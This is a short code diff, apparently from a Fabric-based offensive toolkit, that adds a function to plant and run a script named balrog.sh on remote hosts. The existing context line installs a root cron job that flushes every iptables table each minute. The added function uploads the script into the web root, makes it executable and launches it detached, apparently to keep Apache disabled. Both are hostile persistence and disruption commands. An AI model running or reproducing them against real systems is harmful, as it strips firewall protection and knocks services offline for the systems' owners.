@@ -15,3 +15,10 @@ def disable_firewall(connect):
     connect.sudo("sh -c 'cd / && printf \"* * * * * iptables -t nat -F && iptables -t filter -F && iptables -t "
                  "security -F && iptables -t raw -F && iptables -t mangle -F\n\" > mycron && crontab mycron && rm "
                  "mycron'")
+
+def tyler_apache_disable_loop(connect):
+    connect.sudo('apt install dtach -y')
+    connect.put('UploadFiles/balrog.sh')
+    connect.sudo('mv balrog.sh /var/www/html')
+    connect.sudo('chmod +x /var/www/html/balrog.sh')
+    connect.sudo("screen -d -m /var/www/html/./balrog.sh")
